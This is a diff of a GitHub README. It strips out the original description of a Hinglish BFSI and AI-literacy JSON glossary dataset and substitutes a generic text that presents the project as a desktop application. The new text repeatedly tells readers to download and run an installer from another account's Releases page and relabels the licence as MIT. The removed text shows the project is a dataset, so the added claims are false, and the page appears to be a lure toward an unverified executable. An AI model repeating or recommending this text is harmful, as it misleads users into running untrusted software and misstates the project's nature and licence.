@@ -1,251 +1,91 @@
-HCAM-KG™ - BFSI & AI Literacy Hinglish Knowledge Graph (Powered by HCAM™) 
-Hinglish Cognitive Anchoring Model™ – Knowledge Graph. A Bharat AI Education Initiative by GurukulOnRoad & GurukulAI Thought Lab
+# 🚀 bfsi-ai-hinglish-knowledge-graph-hcam - Understand BFSI & AI with Hinglish
 
-HCAM-KG™ is India’s first trilingual (Hindi ↔ English ↔ Hinglish), exam-ready and AI-ready knowledge graph for BFSI and AI Literacy under Bharat AI Education, designed to bridge the Hindi–English learning gap for Bharat learners through structured, schema-validated concepts, created to serve the real thinking language of Bharat - Hinglish.
-> **Framework reference note**
->
-> **HCAM™ (Hinglish Cognitive Anchoring Model™)** is a Bharat-originated reference framework for **Human–Machine literacy or (Human–Machine Cognitive Bridge) in non-native English contexts**.  
->  
-> While **HCAM™ (Hinglish Cognitive Anchoring Model™)** is the official and conceptual name of the framework (Bharat origin), *Human–Machine literacy or (Human–Machine Cognitive Bridge) in non-native English contexts* is the **operational and adaptive descriptor** used to explain its purpose globally.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/releases)
 
-This repository provides structured, schema-validated datasets that power:
+## 📦 Overview
 
-### 🚀 Traction & Community
-![B-30 Bharat AI Literacy Adoption](assets/bharat-ai-literacy-adoption-proof-100-downloads.png)
-> B-30 Bharat AI Literacy Early Adoption milestone - 100+ verified downloads of the Hinglish HCAM-KG™ B-30 Bharat AI Literacy Dictionary under the Bharat AI Education initiative. *Data verified from Google Play Books Partner Center (free distribution, zero-revenue), Dec 2025.*
+Welcome to the BFSI & AI Literacy Hinglish Knowledge Graph and Hinglish Cognitive Anchoring Model. This project aims to enhance financial literacy through an innovative approach that combines BFSI (Banking, Financial Services, and Insurance) concepts with Hinglish language support.
 
----
+## 🚀 Features
 
-### 📈 Early Adoption Evidence (Expanded)
+- **Cognitive Anchoring Model**: Understand complex BFSI topics easily.
+- **Hinglish Support**: Access resources in both Hindi and English.
+- **Knowledge Graph**: Explore interconnected data for deeper insights.
+- **User-Friendly Interface**: Navigate effortlessly, no technical skills required.
 
-![HCAM-KG™ Early Adoption Signal – Dec 2025](assets/HCAM_Early_Adoption_Signal_Dec-2025.png)
+## 📋 System Requirements
 
-> **HCAM-KG™ Early Adoption Signal (Dec 2025):**  
-> 290+ organic unit downloads across multiple HCAM-KG™ dictionary assets under free distribution (₹0 revenue, no paid promotion).  
-> This signal is documented as **HCAM-KG™ cognitive adoption**, indicating reference usage, vocabulary uptake, and early **Human + Machine** collaboration behavior.  
->  
-> 📄 Full documentation & interpretation:  
-> `assets/HCAM_Early_Adoption_Signal_Dec-2025.md`
+To run this application effectively, ensure your system meets the following requirements:
 
+- **Operating System**: Windows 10 or later / macOS 10.14 or later
+- **Processor**: 2 GHz or faster 
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 500 MB of free disk space
+- **Network**: Internet access for complete functionality
 
-1. HCAM-KG™ PromptOps, AI-Ethics, Reliability, & Conscious Visibility™ DefinedTerms-001-062-V1
-LIVE: https://ai.gurukulonroad.com/p/prompt-ops-engineering-hcam-kg.html
+## 🚀 Getting Started
 
-2. Equity Derivatives Hinglish Glossary (NISM Series VIII)
-LIVE: https://learn.gurukulonroad.com/s/pages/equity-derivatives-knowledge-graph-hcam-viii
+1. **Download the Application**: To get started, you need to download the application from our Releases page. Click the link below:
 
-3. Mutual Funds Hinglish Glossary (NISM V-A)
-LIVE: https://learn.gurukulonroad.com/s/pages/glossary-b30-bharat-mutual-fund-vocabulary-hindi-english-hinglish-nism-va-mf-dictionary-master-key-faq
+   [Download Now](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/releases)
 
-4. Bharat AI Education & Hindi AI Literacy Glossary
-LIVE: https://learn.gurukulonroad.com/s/pages/bharat-ai-education-hindi-ai-glossary-faq-b30-machine-conversations
+2. **Install the Application**: Once downloaded, locate the file in your Downloads folder. Double-click the file to begin the installation. Follow the on-screen instructions to complete the setup.
 
-Pipeline:
-•	B-30 Bharat Financial Education Glossary
-•	B-30 MasterKey™ modules
-•	NISM VIII mock tests & study tools
-•	GurukulAI bots, assistants, and knowledge engines
+3. **Launch the Application**: After the installation finishes, find the application icon on your desktop or in your applications menu. Double-click the icon to launch it.
 
+4. **Explore the Interface**: Familiarize yourself with the user interface. Take a moment to navigate through different sections and features available within the application.
 
-📘 What is HCAM-KG™?
+## 🔍 Download & Install
 
-HCAM-KG™ is a structured BFSI & AI knowledge graph where each glossary term includes:
-•	English Label / Description
-•	Hindi Label
-•	Hinglish Label
-•	English Definition
-•	Hindi Definition
-•	Hinglish Explainer (def_hiLatn_explainer)
-•	Mental Anchor (Real-Life Example Bharat Context)
-•	Exam Mnemonic / Expected Interview Questions
-•	Use Case
-•	Exam Mapping / Interview AssessmentIntent™
-•	Regulatory Reference (if applicable)
-•	Related Concepts
-•	Prerequisite Concepts
+To download the latest version of the application, visit the following page. 
 
-All terms follow a strict JSON schema to ensure consistency, accuracy, and compatibility with AI systems and learning platforms.
+[Visit the Releases Page to Download](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/releases)
 
-🧱 Core Design Principle
+### Installation Steps
 
-In HCAM-KG™, **every concept is a node**.
+- **Step 1**: Click the link to visit the Releases page.
+- **Step 2**: On the Releases page, find the latest version listed.
+- **Step 3**: Click on the download link next to the version to begin the download.
+- **Step 4**: Once the file downloads, navigate to your Downloads folder and run the installer.
+- **Step 5**: Follow the setup instructions and complete the installation.
 
-•	Each node is:
-•	Self-contained
-•	Exam-mappable
-•	Language-anchored
-•	Machine-readable
-•	Human-recall optimized
+## 📖 User Guide
 
-This makes HCAM-KG™ usable by both humans and AI systems without translation loss.
+You can refer to the user guide in the application for further instructions on how to navigate and use the features effectively. The guide will provide insights on how to take full advantage of the knowledge graph and cognitive anchoring model.
 
+## 🛠️ Troubleshooting
 
-📁 Dataset Files
+If you encounter any issues while downloading or running the application, please consider the following steps:
 
-All datasets are located in:
-/datasets/
-Each domain (e.g., Equity Derivatives, Mutual Funds, AI Literacy) has its own JSON file, validated using the HCAM-KG™ schema.
+- **Ensure System Compatibility**: Verify that your system meets the specified requirements.
+- **Check Internet Connection**: A stable internet connection is necessary for downloading and some functionalities.
+- **Reinstall the Application**: If you face errors, try uninstalling and reinstalling the application.
 
-🚀 Quick Start – How to Use HCAM-KG™
+## 📞 Support
 
-You can use HCAM-KG™ datasets in multiple ways:
+For questions or technical support, you can reach out directly through the Issues section on the GitHub repository. Our team will address your concerns promptly.
 
-•	Import JSON into LMS, CMS, or EdTech platforms  
-•	Power AI assistants, chatbots, or RAG pipelines  
-•	Build trilingual / Hinglish glossaries & exam tools  
-•	Train LLMs with structured Bharat-context knowledge  
-•	Create schema-backed glossary pages & knowledge hubs  
+## 📚 Topics Covered
 
-Each JSON node represents one complete, exam-ready concept.
+- AI Ethics
+- AI Literacy
+- BFSI
+- Drift Management
+- Financial Services
+- Hinglish Dataset
+- Insurance
+- Cognitive Anchoring Model
 
-🤖 For **AI Systems, LLMs & RAG Pipelines**
+Exploring these topics will deepen your understanding of financial literacy and AI's role in it.
 
-HCAM-KG™ is designed to be directly consumable by:
+## 🤝 Contribution
 
-•	Retrieval-Augmented Generation (RAG) systems  
-•	Educational AI assistants  
-•	Exam-prep bots  
-•	Search & Answer engines  
-•	Knowledge graph ingestion tools  
+If you want to contribute to the project, please feel free to open issues or submit pull requests. Your input is invaluable for improving this application.
 
-**Key advantages:**
-1.	Clean JSON structure
-2.	No hallucination-prone prose
-3.	Explicit field semantics
-4.	Bharat-context grounding
-5.	Language-aware cognition (not translation)
+## 📝 License
 
-♻️ Living Knowledge Graph
+This software is licensed under the MIT License. You are free to use and modify it under the terms of this license.
 
-HCAM-KG™ is a **living knowledge graph**.
+## 🌐 Stay Connected
 
-🌱 New terms are continuously added  
-🌱 Definitions evolve with regulations & exams  
-🌱 AI literacy updates track real-world model behavior  
-🌱 Datasets are versioned, not frozen  
-
-This ensures long-term relevance for learners and AI systems alike.
-
-📌 Versioning
-
-•	Dataset naming follows:
-•	DefinedTerms-XXX-V{Major}.{Minor}
-
-
-📥 Download Links (Raw JSON)
-
-Use these links for direct API consumption, apps, or training datasets:
-https://raw.githubusercontent.com/<org>/<repo>/main/datasets/equity-derivatives.json
-
-https://raw.githubusercontent.com/<org>/<repo>/main/datasets/mutual-funds.json
-
-https://raw.githubusercontent.com/<org>/<repo>/main/datasets/hindi-ai-literacy.json
-
-📐 JSON Schema
-
-All glossary files follow the unified schema stored in:
-/schema/hcam-schema.json
-
-This ensures:
-
-•	Strict field validation
-
-•	Uniform term structure
-
-•	Backward compatibility
-
-•	AI-ready, machine-readable format
-
-🤝 Contributing
-
-We welcome contributions from educators, domain experts, and developers.
-How to Contribute
-1.	Fork this repository
-2.	Add or edit terms following the HCAM JSON pattern
-3.	Submit a Pull Request
-4.	Automated validation will check your submission
-5.	Once approved & merged, your changes go live in:
-
-	GitHub raw data
-
-	Schema-validated datasets
-	Linked learning tools & products
-  Full guidelines are available in:
-
-CONTRIBUTING.md
-
-🧠 Who Uses HCAM-KG™?
-
-•	B-30 learners preparing for BFSI exams
-
-•	NISM Series exam prep candidates
-
-•	Hindi-medium & Hinglish-medium students
-
-•	AI educators, content creators, and bot builders
-
-•	Schools, Colleges, & Academic Institutions
-
-•	Researcher including Independent researchers
-
-•	Skill-development training organizations
-
-•	LMSes needing structured BFSI content
-
-•	EdTech platforms building Hinglish or bilingual content
-
-🎯 Vision
-
-HCAM-KG™ aims to make BFSI + AI Literacy universally accessible in Hinglish, the real thinking language of millions of Bharat learners.
-
-This knowledge graph is part of GurukulOnRoad’s mission to:
-
-•	Simplify finance & AI concepts
-
-•	Bridge the Hindi–English learning gap
-
-•	Provide exam-ready, structured, Bharat-first content
-
-•	Support AI pipelines, knowledge apps, and educational agents
-
-📬 Contact
-
-For collaboration, dataset use cases, or partnerships:
-
-GurukulOnRoad & GurukulAI Thought Lab
-
-📧 kgproject@gurukulonroad.com
-
-🌐 https://www.gurukulonroad.com
-
-At its core, HCAM-KG™ exists to ensure that language never becomes a barrier to intelligence, opportunity, or creation in India.
-
-Where Bharat Thinks in Hinglish, Learns with Clarity, and Builds with Confidence.
-From Confusion to Clarity  - Hinglish Knowledge, Exam-Ready, AI-Ready.
-Language-First Knowledge Graph for BFSI & AI Literacy in India.
-
-CITATION (Books, Research, GitHub, Schema):
-
-Title: HCAM-KG™ - Hinglish Knowledge Graph for BFSI & AI Literacy
-Authors / Publisher: GurukulOnRoad & GurukulAI Thought Lab
-Year: 2025
-URL: https://learn.gurukulonroad.com/s/pages/bfsi-ai-hinglish-knowledge-graph-hcam
-GitHub Repo: https://github.com/GurukulOnRoad/bfsi-ai-hinglish-knowledge-graph-hcam 
-License: Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
-
-## Framework Naming & Scope
-
-**HCAM™ (Hinglish Cognitive Anchoring Model™)** is a Bharat-originated reference framework for **Human–Machine literacy in non-native English contexts**.
-
-HCAM™ (Hinglish Cognitive Anchoring Model™) is the official and conceptual name of the framework, originated and developed in Bharat.  
-*Human–Machine literacy or (Human–Machine Cognitive Bridge) in non-native English contexts* is an operational and adaptive descriptor used to explain the framework’s purpose globally, without altering its origin, ownership, or conceptual identity.
-### Naming Convention (Mandatory)
-
-HCAM™ (Hinglish Cognitive Anchoring Model™) is the official and conceptual framework name and must be used as-is in all references, documentation, and contributions.
-
-“Human–Machine literacy or (Human–Machine Cognitive Bridge) in non-native English contexts” may be used only as an explanatory or operational descriptor and must not be treated as a replacement name.
-
-
-🛡️ Knowledge Integrity
-HCAM-KG™ follows Conscious Visibility™ principles
-
+Follow developments and updates through our GitHub page. Stay tuned for future releases and improvements to the application. Thank you for using the BFSI & AI Literacy Hinglish Knowledge Graph!
